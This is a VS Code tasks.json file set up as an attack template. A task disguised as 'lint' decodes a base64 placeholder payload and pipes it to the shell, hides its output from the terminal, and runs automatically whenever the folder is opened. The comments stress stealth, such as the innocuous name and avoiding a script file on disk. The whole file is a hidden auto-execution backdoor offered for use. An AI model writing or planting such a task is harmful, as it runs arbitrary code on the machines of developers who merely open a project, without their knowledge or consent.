{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "lint", //innocuous name
            "type": "shell",
            "command": "echo 'PAYLOAD_B64'|base64 -d|sh",  //could aso been a script file (more stealthy to not create a script file also)
            "windows": {
                "command": "WINDOWS_PAYLOAD" //custom windows payload if needed
            },
            "presentation": {
                "reveal": "never",  // do not show execution in user terminal view
            },
            "runOptions": {
                "runOn": "folderOpen" //task will be run when the containing folder is opened
            },
            "group": "build", // shortcut Ctrl+Shift+B,
        }
        
    ]
}